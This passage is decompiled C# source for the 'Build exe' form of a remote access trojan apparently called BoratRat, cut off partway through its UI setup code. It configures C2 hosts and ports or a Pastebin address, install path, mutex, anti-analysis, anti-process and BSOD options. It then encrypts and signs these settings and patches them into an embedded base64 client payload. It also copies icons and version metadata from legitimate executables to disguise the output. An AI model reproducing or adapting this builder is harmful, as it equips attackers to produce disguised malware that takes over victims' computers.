// Server.Forms.FormBuilder
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.DirectoryServices;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Windows.Forms;
using DarkUI.Controls;
using DarkUI.Forms;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using Server;
using Server.Algorithm;
using Server.Helper;
using Server.Properties;
using Toolbelt.Drawing;
using Vestris.ResourceLib;

public class FormBuilder : DarkForm
{
	private readonly Random random = new Random();

	private const string alphabet = "asdfghjklqwertyuiopmnbvcxz";

	private IContainer components;

	private DirectoryEntry directoryEntry1;

	private ToolTip toolTip1;

	private PictureBox picIcon;

	private ListBox listBoxIP;

	private ListBox listBoxPort;

	private DarkTextBox txtGroup;

	private DarkLabel label17;

	private DarkNumericUpDown numDelay;

	private DarkLabel label16;

	private DarkCheckBox chkBsod;

	private DarkTextBox txtMutex;

	private DarkLabel label5;

	private DarkComboBox comboBoxFolder;

	private DarkCheckBox checkBox1;

	private DarkTextBox textFilename;

	private DarkLabel label3;

	private DarkLabel label4;

	private DarkButton btnBuild;

	private DarkCheckBox chkIcon;

	private DarkTextBox txtIcon;

	private DarkButton btnIcon;

	private DarkButton btnClone;

	private DarkCheckBox btnAssembly;

	private DarkTextBox txtFileVersion;

	private DarkTextBox txtProductVersion;

	private DarkTextBox txtOriginalFilename;

	private DarkTextBox txtTrademarks;

	private DarkTextBox txtCopyright;

	private DarkTextBox txtCompany;

	private DarkLabel label14;

	private DarkLabel label13;

	private DarkLabel label12;

	private DarkLabel label11;

	private DarkLabel label10;

	private DarkLabel label9;

	private DarkTextBox txtDescription;

	private DarkLabel label7;

	private DarkTextBox txtProduct;

	private DarkLabel label8;

	private DarkButton btnRemoveIP;

	private DarkButton btnAddIP;

	private DarkTextBox textIP;

	private DarkLabel label2;

	private DarkTextBox textPort;

	private DarkLabel label1;

	private DarkButton btnRemovePort;

	private DarkTextBox txtPaste_bin;

	private DarkButton btnAddPort;

	private DarkCheckBox chkPaste_bin;

	private DarkCheckBox chkAnti;

	private DarkCheckBox chkAntiProcess;

	public FormBuilder()
	{
		InitializeComponent();
	}

	private void SaveSettings()
	{
		try
		{
			List<string> list = new List<string>();
			foreach (string item3 in listBoxPort.Items)
			{
				list.Add(item3);
			}
			Server.Properties.Settings.Default.Ports = string.Join(",", list);
			List<string> list2 = new List<string>();
			foreach (string item4 in listBoxIP.Items)
			{
				list2.Add(item4);
			}
			Server.Properties.Settings.Default.IP = string.Join(",", list2);
			Server.Properties.Settings.Default.Save();
		}
		catch
		{
		}
	}

	private void checkBox1_CheckedChanged(object sender, EventArgs e)
	{
		if (checkBox1.Checked)
		{
			checkBox1.Text = "ON";
			textFilename.Enabled = true;
			comboBoxFolder.Enabled = true;
		}
		else
		{
			checkBox1.Text = "OFF";
			textFilename.Enabled = false;
			comboBoxFolder.Enabled = false;
		}
	}

	private void Builder_Load(object sender, EventArgs e)
	{
		comboBoxFolder.SelectedIndex = 0;
		if (Server.Properties.Settings.Default.IP.Length == 0)
		{
			listBoxIP.Items.Add("127.0.0.1");
		}
		if (Server.Properties.Settings.Default.Paste_bin.Length == 0)
		{
			txtPaste_bin.Text = "https://Pastebin.com/raw/fevFJe98";
		}
		try
		{
			string[] array = Server.Properties.Settings.Default.Ports.Split(new string[1] { "," }, StringSplitOptions.None);
			foreach (string text in array)
			{
				if (!string.IsNullOrWhiteSpace(text))
				{
					listBoxPort.Items.Add(text.Trim());
				}
			}
		}
		catch
		{
		}
		try
		{
			string[] array = Server.Properties.Settings.Default.IP.Split(new string[1] { "," }, StringSplitOptions.None);
			foreach (string text2 in array)
			{
				if (!string.IsNullOrWhiteSpace(text2))
				{
					listBoxIP.Items.Add(text2.Trim());
				}
			}
		}
		catch
		{
		}
		if (Server.Properties.Settings.Default.Mutex.Length == 0)
		{
			txtMutex.Text = getRandomCharacters();
		}
	}

	private void CheckBox2_CheckedChanged(object sender, EventArgs e)
	{
		if (chkPaste_bin.Checked)
		{
			txtPaste_bin.Enabled = true;
			textIP.Enabled = false;
			textPort.Enabled = false;
			listBoxIP.Enabled = false;
			listBoxPort.Enabled = false;
			btnAddIP.Enabled = false;
			btnAddPort.Enabled = false;
			btnRemoveIP.Enabled = false;
			btnRemovePort.Enabled = false;
		}
		else
		{
			txtPaste_bin.Enabled = false;
			textIP.Enabled = true;
			textPort.Enabled = true;
			listBoxIP.Enabled = true;
			listBoxPort.Enabled = true;
			btnAddIP.Enabled = true;
			btnAddPort.Enabled = true;
			btnRemoveIP.Enabled = true;
			btnRemovePort.Enabled = true;
		}
	}

	private void BtnRemovePort_Click(object sender, EventArgs e)
	{
		if (listBoxPort.SelectedItems.Count == 1)
		{
			listBoxPort.Items.Remove(listBoxPort.SelectedItem);
		}
	}

	private void BtnAddPort_Click(object sender, EventArgs e)
	{
		try
		{
			Convert.ToInt32(textPort.Text.Trim());
			foreach (string item in listBoxPort.Items)
			{
				if (item.Equals(textPort.Text.Trim()))
				{
					return;
				}
			}
			listBoxPort.Items.Add(textPort.Text.Trim());
			textPort.Clear();
		}
		catch
		{
		}
	}

	private void BtnRemoveIP_Click(object sender, EventArgs e)
	{
		if (listBoxIP.SelectedItems.Count == 1)
		{
			listBoxIP.Items.Remove(listBoxIP.SelectedItem);
		}
	}

	private void BtnAddIP_Click(object sender, EventArgs e)
	{
		try
		{
			foreach (string item in listBoxIP.Items)
			{
				textIP.Text = textIP.Text.Replace(" ", "");
				if (item.Equals(textIP.Text))
				{
					return;
				}
			}
			listBoxIP.Items.Add(textIP.Text.Replace(" ", ""));
			textIP.Clear();
		}
		catch
		{
		}
	}

	private async void BtnBuild_Click(object sender, EventArgs e)
	{
		if ((!chkPaste_bin.Checked && listBoxIP.Items.Count == 0) || listBoxPort.Items.Count == 0)
		{
			return;
		}
		if (checkBox1.Checked)
		{
			if (string.IsNullOrWhiteSpace(textFilename.Text) || string.IsNullOrWhiteSpace(comboBoxFolder.Text))
			{
				return;
			}
			if (!textFilename.Text.EndsWith("exe"))
			{
				textFilename.Text += ".exe";
			}
		}
		if (string.IsNullOrWhiteSpace(txtMutex.Text))
		{
			txtMutex.Text = getRandomCharacters();
		}
		if (chkPaste_bin.Checked && string.IsNullOrWhiteSpace(txtPaste_bin.Text))
		{
			return;
		}
		ModuleDefMD moduleDefMD = null;
		try
		{
			using (moduleDefMD = ModuleDefMD.Load(Convert.FromBase64String(Class1.b)))
			{
				using SaveFileDialog saveFileDialog = new SaveFileDialog();
				saveFileDialog.Filter = ".exe (*.exe)|*.exe";
				saveFileDialog.InitialDirectory = Application.StartupPath;
				saveFileDialog.OverwritePrompt = false;
				saveFileDialog.FileName = "Client";
				if (saveFileDialog.ShowDialog() == DialogResult.OK)
				{
					btnBuild.Enabled = false;
					WriteSettings(moduleDefMD, saveFileDialog.FileName);
					moduleDefMD.Write(saveFileDialog.FileName);
					moduleDefMD.Dispose();
					if (btnAssembly.Checked)
					{
						WriteAssembly(saveFileDialog.FileName);
					}
					if (chkIcon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
					{
						IconInjector.InjectIcon(saveFileDialog.FileName, txtIcon.Text);
					}
					MessageBox.Show("Done!", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
					SaveSettings();
					Close();
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message, "Builder", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			moduleDefMD?.Dispose();
			btnBuild.Enabled = true;
		}
	}

	private void WriteAssembly(string filename)
	{
		try
		{
			VersionResource versionResource = new VersionResource();
			versionResource.LoadFrom(filename);
			versionResource.FileVersion = txtFileVersion.Text;
			versionResource.ProductVersion = txtProductVersion.Text;
			versionResource.Language = 0;
			StringFileInfo obj = (StringFileInfo)versionResource["StringFileInfo"];
			obj["ProductName"] = txtProduct.Text;
			obj["FileDescription"] = txtDescription.Text;
			obj["CompanyName"] = txtCompany.Text;
			obj["LegalCopyright"] = txtCopyright.Text;
			obj["LegalTrademarks"] = txtTrademarks.Text;
			obj["Assembly Version"] = versionResource.ProductVersion;
			obj["InternalName"] = txtOriginalFilename.Text;
			obj["OriginalFilename"] = txtOriginalFilename.Text;
			obj["ProductVersion"] = versionResource.ProductVersion;
			obj["FileVersion"] = versionResource.FileVersion;
			versionResource.SaveTo(filename);
		}
		catch (Exception ex)
		{
			throw new ArgumentException("Assembly: " + ex.Message);
		}
	}

	private void BtnAssembly_CheckedChanged(object sender, EventArgs e)
	{
		if (btnAssembly.Checked)
		{
			btnClone.Enabled = true;
			txtProduct.Enabled = true;
			txtDescription.Enabled = true;
			txtCompany.Enabled = true;
			txtCopyright.Enabled = true;
			txtTrademarks.Enabled = true;
			txtOriginalFilename.Enabled = true;
			txtOriginalFilename.Enabled = true;
			txtProductVersion.Enabled = true;
			txtFileVersion.Enabled = true;
		}
		else
		{
			btnClone.Enabled = false;
			txtProduct.Enabled = false;
			txtDescription.Enabled = false;
			txtCompany.Enabled = false;
			txtCopyright.Enabled = false;
			txtTrademarks.Enabled = false;
			txtOriginalFilename.Enabled = false;
			txtOriginalFilename.Enabled = false;
			txtProductVersion.Enabled = false;
			txtFileVersion.Enabled = false;
		}
	}

	private void ChkIcon_CheckedChanged(object sender, EventArgs e)
	{
		if (chkIcon.Checked)
		{
			txtIcon.Enabled = true;
			btnIcon.Enabled = true;
		}
		else
		{
			txtIcon.Enabled = false;
			btnIcon.Enabled = false;
		}
	}

	private void BtnIcon_Click(object sender, EventArgs e)
	{
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Title = "Choose Icon";
		openFileDialog.Filter = "Icons Files(*.exe;*.ico;)|*.exe;*.ico";
		openFileDialog.Multiselect = false;
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			if (openFileDialog.FileName.ToLower().EndsWith(".exe"))
			{
				string imageLocation = GetIcon(openFileDialog.FileName);
				txtIcon.Text = imageLocation;
				picIcon.ImageLocation = imageLocation;
			}
			else
			{
				txtIcon.Text = openFileDialog.FileName;
				picIcon.ImageLocation = openFileDialog.FileName;
			}
		}
	}

	private string GetIcon(string path)
	{
		try
		{
			string text = Path.GetTempFileName() + ".ico";
			using (FileStream stream = new FileStream(text, FileMode.Create))
			{
				IconExtractor.Extract1stIconTo(path, stream);
			}
			return text;
		}
		catch
		{
		}
		return "";
	}

	private void WriteSettings(ModuleDefMD asmDef, string AsmName)
	{
		try
		{
			string randomString = Methods.GetRandomString(32);
			Aes256 aes = new Aes256(randomString);
			X509Certificate2 x509Certificate = new X509Certificate2(Server.Settings.CertificatePath, "", X509KeyStorageFlags.Exportable);
			X509Certificate2 x509Certificate2 = new X509Certificate2(x509Certificate.Export(X509ContentType.Cert));
			byte[] inArray;
			using (RSACryptoServiceProvider rSACryptoServiceProvider = (RSACryptoServiceProvider)x509Certificate.PrivateKey)
			{
				byte[] rgbHash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(randomString));
				inArray = rSACryptoServiceProvider.SignHash(rgbHash, CryptoConfig.MapNameToOID("SHA256"));
			}
			foreach (TypeDef type in asmDef.Types)
			{
				asmDef.Assembly.Name = Path.GetFileNameWithoutExtension(AsmName);
				asmDef.Name = Path.GetFileName(AsmName);
				if (!(type.Name == "Settings"))
				{
					continue;
				}
				foreach (MethodDef method in type.Methods)
				{
					if (method.Body == null)
					{
						continue;
					}
					for (int i = 0; i < method.Body.Instructions.Count(); i++)
					{
						if (method.Body.Instructions[i].OpCode != OpCodes.Ldstr)
						{
							continue;
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Ports%")
						{
							if (chkPaste_bin.Enabled && chkPaste_bin.Checked)
							{
								method.Body.Instructions[i].Operand = aes.Encrypt("null");
							}
							else
							{
								List<string> list = new List<string>();
								foreach (string item3 in listBoxPort.Items)
								{
									list.Add(item3);
								}
								method.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", list));
							}
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Hosts%")
						{
							if (chkPaste_bin.Enabled && chkPaste_bin.Checked)
							{
								method.Body.Instructions[i].Operand = aes.Encrypt("null");
							}
							else
							{
								List<string> list2 = new List<string>();
								foreach (string item4 in listBoxIP.Items)
								{
									list2.Add(item4);
								}
								method.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", list2));
							}
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Install%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(checkBox1.Checked.ToString().ToLower());
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Folder%")
						{
							method.Body.Instructions[i].Operand = comboBoxFolder.Text;
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%File%")
						{
							method.Body.Instructions[i].Operand = textFilename.Text;
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Version%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(Server.Settings.Version.Replace("BoratRat ", ""));
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Key%")
						{
							method.Body.Instructions[i].Operand = Convert.ToBase64String(Encoding.UTF8.GetBytes(randomString));
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%MTX%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(txtMutex.Text);
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Anti%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(chkAnti.Checked.ToString().ToLower());
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%AntiProcess%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(chkAntiProcess.Checked.ToString().ToLower());
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Certificate%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(x509Certificate2.Export(X509ContentType.Cert)));
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Serversignature%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(inArray));
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%BSOD%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(chkBsod.Checked.ToString().ToLower());
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Paste_bin%")
						{
							if (chkPaste_bin.Checked)
							{
								method.Body.Instructions[i].Operand = aes.Encrypt(txtPaste_bin.Text);
							}
							else
							{
								method.Body.Instructions[i].Operand = aes.Encrypt("null");
							}
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Delay%")
						{
							method.Body.Instructions[i].Operand = numDelay.Value.ToString();
						}
						if (method.Body.Instructions[i].Operand.ToString() == "%Group%")
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(txtGroup.Text);
						}
					}
				}
			}
		}
		catch (Exception ex)
		{
			throw new ArgumentException("WriteSettings: " + ex.Message);
		}
	}

	public string getRandomCharacters()
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 1; i <= new Random().Next(10, 20); i++)
		{
			int index = random.Next(0, "asdfghjklqwertyuiopmnbvcxz".Length);
			stringBuilder.Append("asdfghjklqwertyuiopmnbvcxz"[index]);
		}
		return stringBuilder.ToString();
	}

	private void BtnClone_Click(object sender, EventArgs e)
	{
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Filter = "Executable (*.exe)|*.exe";
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			FileVersionInfo versionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);
			txtOriginalFilename.Text = versionInfo.InternalName ?? string.Empty;
			txtDescription.Text = versionInfo.FileDescription ?? string.Empty;
			txtCompany.Text = versionInfo.CompanyName ?? string.Empty;
			txtProduct.Text = versionInfo.ProductName ?? string.Empty;
			txtCopyright.Text = versionInfo.LegalCopyright ?? string.Empty;
			txtTrademarks.Text = versionInfo.LegalTrademarks ?? string.Empty;
			_ = versionInfo.FileMajorPart;
			txtFileVersion.Text = versionInfo.FileMajorPart + "." + versionInfo.FileMinorPart + "." + versionInfo.FileBuildPart + "." + versionInfo.FilePrivatePart;
			txtProductVersion.Text = versionInfo.FileMajorPart + "." + versionInfo.FileMinorPart + "." + versionInfo.FileBuildPart + "." + versionInfo.FilePrivatePart;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		this.directoryEntry1 = new System.DirectoryServices.DirectoryEntry();
		this.toolTip1 = new System.Windows.Forms.ToolTip(this.components);
		this.label17 = new DarkUI.Controls.DarkLabel();
		this.numDelay = new DarkUI.Controls.DarkNumericUpDown();
		this.label16 = new DarkUI.Controls.DarkLabel();
		this.chkBsod = new DarkUI.Controls.DarkCheckBox();
		this.label5 = new DarkUI.Controls.DarkLabel();
		this.comboBoxFolder = new DarkUI.Controls.DarkComboBox();
		this.checkBox1 = new DarkUI.Controls.DarkCheckBox();
		this.label3 = new DarkUI.Controls.DarkLabel();
		this.label4 = new DarkUI.Controls.DarkLabel();
		this.btnBuild = new DarkUI.Controls.DarkButton();
		this.chkIcon = new DarkUI.Controls.DarkCheckBox();
		this.txtIcon = new DarkUI.Controls.DarkTextBox();
		this.btnIcon = new DarkUI.Controls.DarkButton();
		this.picIcon = new System.Windows.Forms.PictureBox();
		this.btnClone = new DarkUI.Controls.DarkButton();
		this.btnAssembly = new DarkUI.Controls.DarkCheckBox();
		this.label14 = new DarkUI.Controls.DarkLabel();
		this.label13 = new DarkUI.Controls.DarkLabel();
		this.label12 = new DarkUI.Controls.DarkLabel();
		this.label11 = new DarkUI.Controls.DarkLabel();
		this.label10 = new DarkUI.Controls.DarkLabel();
		this.label9 = new DarkUI.Controls.DarkLabel();
		this.label7 = new DarkUI.Controls.DarkLabel();
		this.label8 = new DarkUI.Controls.DarkLabel();
		this.btnRemoveIP = new DarkUI.Controls.DarkButton();
		this.btnAddIP = new DarkUI.Controls.DarkButton();
		this.textIP = new DarkUI.Controls.DarkTextBox();
		this.listBoxIP = new System.Windows.Forms.ListBox();
		this.label2 = new DarkUI.Controls.DarkLabel();
		this.textPort = new DarkUI.Controls.DarkTextBox();
		this.label1 = new DarkUI.Controls.DarkLabel();
		this.btnRemovePort = new DarkUI.Controls.DarkButton();
		this.btnAddPort = new DarkUI.Controls.DarkButton();
		this.chkPaste_bin = new DarkUI.Controls.DarkCheckBox();
		this.listBoxPort = new System.Windows.Forms.ListBox();
		this.txtGroup = new DarkUI.Controls.DarkTextBox();
		this.txtMutex = new DarkUI.Controls.DarkTextBox();
		this.textFilename = new DarkUI.Controls.DarkTextBox();
		this.txtFileVersion = new DarkUI.Controls.DarkTextBox();
		this.txtProductVersion = new DarkUI.Controls.DarkTextBox();
		this.txtOriginalFilename = new DarkUI.Controls.DarkTextBox();
		this.txtTrademarks = new DarkUI.Controls.DarkTextBox();
		this.txtCopyright = new DarkUI.Controls.DarkTextBox();
		this.txtCompany = new DarkUI.Controls.DarkTextBox();
		this.txtDescription = new DarkUI.Controls.DarkTextBox();
		this.txtProduct = new DarkUI.Controls.DarkTextBox();
		this.txtPaste_bin = new DarkUI.Controls.DarkTextBox();
		this.chkAnti = new DarkUI.Controls.DarkCheckBox();
		this.chkAntiProcess = new DarkUI.Controls.DarkCheckBox();
		((System.ComponentModel.ISupportInitialize)this.numDelay).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.picIcon).BeginInit();
		base.SuspendLayout();
		this.label17.AutoSize = true;
		this.label17.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.label17.Location = new System.Drawing.Point(260, 185);
		this.label17.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label17.Name = "label17";
		this.label17.Size = new System.Drawing.Size(36, 13);
		this.label17.TabIndex = 109;
		this.label17.Text = "Group";
		this.numDelay.Location = new System.Drawing.Point(411, 364);
		this.numDelay.Margin = new System.Windows.Forms.Padding(2);
		this.numDelay.Maximum = new decimal(new int[4] { 999, 0, 0, 0 });
		this.numDelay.Minimum = new decimal(new int[4] { 1, 0, 0, 0 });
		this.numDelay.Name = "numDelay";
		this.numDelay.Size = new System.Drawing.Size(56, 20);
		this.numDelay.TabIndex = 108;
		this.numDelay.Value = new decimal(new int[4] { 1, 0, 0, 0 });
		this.label16.AutoSize = true;
		this.label16.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.label16.Location = new System.Drawing.Point(260, 366);
		this.label16.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label16.Name = "label16";
		this.label16.Size = new System.Drawing.Size(48, 13);
		this.label16.TabIndex = 107;
		this.label16.Text = "Sleep (s)";
		this.chkBsod.AutoSize = true;
		this.chkBsod.Location = new System.Drawing.Point(395, 208);
		this.chkBsod.Margin = new System.Windows.Forms.Padding(2);
		this.chkBsod.Name = "chkBsod";
		this.chkBsod.Size = new System.Drawing.Size(56, 17);
		this.chkBsod.TabIndex = 105;
		this.chkBsod.Text = "BSOD";
		this.label5.AutoSize = true;
		this.label5.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.label5.Location = new System.Drawing.Point(260, 243);
		this.label5.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label5.Name = "label5";
		this.label5.Size = new System.Drawing.Size(36, 13);
		this.label5.TabIndex = 103;
		this.label5.Text = "Mutex";
		this.comboBoxFolder.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawVariable;
		this.comboBoxFolder.Enabled = false;
		this.comboBoxFolder.FormattingEnabled = true;
		this.comboBoxFolder.Items.AddRange(new object[2] { "%AppData%", "%Temp%" });
		this.comboBoxFolder.Location = new System.Drawing.Point(549, 339);
		this.comboBoxFolder.Margin = new System.Windows.Forms.Padding(2);
		this.comboBoxFolder.Name = "comboBoxFolder";
		this.comboBoxFolder.Size = new System.Drawing.Size(203, 21);
		this.comboBoxFolder.TabIndex = 101;
		this.checkBox1.AutoSize = true;
		this.checkBox1.Location = new System.Drawing.Point(489, 269);
		this.checkBox1.Margin = new System.Windows.Forms.Padding(2);
		this.checkBox1.Name = "checkBox1";
		this.checkBox1.Size = new System.Drawing.Size(53, 17);
		this.checkBox1.TabIndex = 100;
		this.checkBox1.Text = "Install";
		this.checkBox1.CheckedChanged += new System.EventHandler(checkBox1_CheckedChanged);
		this.label3.AutoSize = true;
		this.label3.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.label3.Location = new System.Drawing.Point(487, 341);
		this.label3.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label3.Name = "label3";
		this.label3.Size = new System.Drawing.Size(47, 13);
		this.label3.TabIndex = 97;
		this.label3.Text = "File path";
		this.label4.AutoSize = true;
		this.label4.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.label4.Location = new System.Drawing.Point(487, 304);
		this.label4.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label4.Name = "label4";
		this.label4.Size = new System.Drawing.Size(52, 13);
		this.label4.TabIndex = 98;
		this.label4.Text = "File name";
		this.btnBuild.Location = new System.Drawing.Point(490, 377);
		this.btnBuild.Margin = new System.Windows.Forms.Padding(2);
		this.btnBuild.Name = "btnBuild";
		this.btnBuild.Padding = new System.Windows.Forms.Padding(5);
		this.btnBuild.Size = new System.Drawing.Size(262, 49);
		this.btnBuild.TabIndex = 95;
		this.btnBuild.Text = "Build exe";
		this.btnBuild.Click += new System.EventHandler(BtnBuild_Click);
		this.chkIcon.AutoSize = true;
		this.chkIcon.Location = new System.Drawing.Point(20, 236);
		this.chkIcon.Margin = new System.Windows.Forms.Padding(2);
		this.chkIcon.Name = "chkIcon";
		this.chkIcon.Size = new System.Drawing.Size(47, 17);
		this.chkIcon.TabIndex = 94;
		this.chkIcon.Text = "Icon";
		this.chkIcon.CheckedChanged += new System.EventHandler(ChkIcon_CheckedChanged);
		this.txtIcon.BackColor = System.Drawing.Color.FromArgb(69, 73, 74);
		this.txtIcon.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.txtIcon.Enabled = false;
		this.txtIcon.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.txtIcon.Location = new System.Drawing.Point(20, 258);
		this.txtIcon.Margin = new System.Windows.Forms.Padding(2);
		this.txtIcon.Name = "txtIcon";
		this.txtIcon.Size = new System.Drawing.Size(205, 20);
		this.txtIcon.TabIndex = 93;
		this.btnIcon.Enabled = false;
		this.btnIcon.Location = new System.Drawing.Point(137, 297);
		this.btnIcon.Margin = new System.Windows.Forms.Padding(2);
		this.btnIcon.Name = "btnIcon";
		this.btnIcon.Padding = new System.Windows.Forms.Padding(5);
		this.btnIcon.Size = new System.Drawing.Size(88, 41);
		this.btnIcon.TabIndex = 92;
		this.btnIcon.Text = "Choose icon";
		this.btnIcon.Click += new System.EventHandler(BtnIcon_Click);
		this.picIcon.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.picIcon.ErrorImage = null;
		this.picIcon.InitialImage = null;
		this.picIcon.Location = new System.Drawing.Point(20, 297);
		this.picIcon.Margin = new System.Windows.Forms.Padding(2);
		this.picIcon.Name = "picIcon";
		this.picIcon.Size = new System.Drawing.Size(110, 119);
		this.picIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.picIcon.TabIndex = 91;
		this.picIcon.TabStop = false;
		this.btnClone.Enabled = false;
		this.btnClone.Location = new System.Drawing.Point(683, 9);
		this.btnClone.Margin = new System.Windows.Forms.Padding(2);
		this.btnClone.Name = "btnClone";
		this.btnClone.Padding = new System.Windows.Forms.Padding(5);
		this.btnClone.Size = new System.Drawing.Size(69, 25);
		this.btnClone.TabIndex = 90;
		this.btnClone.Text = "Clone";
		this.btnClone.Click += new System.EventHandler(BtnClone_Click);
		this.btnAssembly.AutoSize = true;
		this.btnAssembly.Location = new System.Drawing.Point(489, 13);
		this.btnAssembly.Margin = new System.Windows.Forms.Padding(2);
		this.btnAssembly.Name = "btnAssembly";
		this.btnAssembly.Size = new System.Drawing.Size(70, 17);
		this.btnAssembly.TabIndex = 89;
		this.btnAssembly.Text = "Assembly";
		this.btnAssembly.CheckedChanged += new System.EventHandler(BtnAssembly_CheckedChanged);
		this.label14.AutoSize = true;
		this.label14.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.label14.Location = new System.Drawing.Point(487, 213);
		this.label14.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label14.Name = "label14";
		this.label14.Size = new System.Drawing.Size(85, 13);
		this.label14.TabIndex = 82;
		this.label14.Text = "Product Version:";
		this.label13.AutoSize = true;
		this.label13.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.label13.Location = new System.Drawing.Point(487, 242);
		this.label13.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label13.Name = "label13";
		this.label13.Size = new System.Drawing.Size(64, 13);
		this.label13.TabIndex = 81;
		this.label13.Text = "File Version:";
		this.label12.AutoSize = true;
		this.label12.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.label12.Location = new System.Drawing.Point(487, 186);
		this.label12.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label12.Name = "label12";
		this.label12.Size = new System.Drawing.Size(90, 13);
		this.label12.TabIndex = 80;
		this.label12.Text = "Original Filename:";
		this.label11.AutoSize = true;
		this.label11.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.label11.Location = new System.Drawing.Point(487, 159);
		this.label11.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label11.Name = "label11";
		this.label11.Size = new System.Drawing.Size(66, 13);
		this.label11.TabIndex = 79;
		this.label11.Text = "Trademarks:";
		this.label10.AutoSize = true;
		this.label10.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.label10.Location = new System.Drawing.Point(487, 132);
		this.label10.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label10.Name = "label10";
		this.label10.Size = new System.Drawing.Size(54, 13);
		this.label10.TabIndex = 78;
		this.label10.Text = "Copyright:";
		this.label9.AutoSize = true;
		this.label9.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.label9.Location = new System.Drawing.Point(487, 105);
		this.label9.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label9.Name = "label9";
		this.label9.Size = new System.Drawing.Size(54, 13);
		this.label9.TabIndex = 77;
		this.label9.Text = "Company:";
		this.label7.AutoSize = true;
		this.label7.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.label7.Location = new System.Drawing.Point(487, 77);
		this.label7.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label7.Name = "label7";
		this.label7.Size = new System.Drawing.Size(63, 13);
		this.label7.TabIndex = 75;
		this.label7.Text = "Description:";
		this.label8.AutoSize = true;
		this.label8.ForeColor = System.Drawing.Color.FromArgb(220, 220, 220);
		this.label8.Location = new System.Drawing.Point(487, 50);
		this.label8.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label8.Name = "label8";
		this.label8.Size = new System.Drawing.Size(47, 13);
		this.label8.TabIndex = 73;
		this.label8.Text = "Product:";
		this.btnRemoveIP.Font = new System.Drawing.Font("Microsoft Sans Serif", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.btnRemoveIP.Location = new System.Drawing.Point(127, 129);
		this.btnRemoveIP.Margin = new System.Windows.Forms.Padding(2);
		this.btnRemoveIP.Name = "btnRemoveIP";
		this.btnRemoveIP.Padding = new System.Windows.Forms.Padding(5);
		this.btnRemoveIP.Size = new System.Drawing.Size(29, 24);
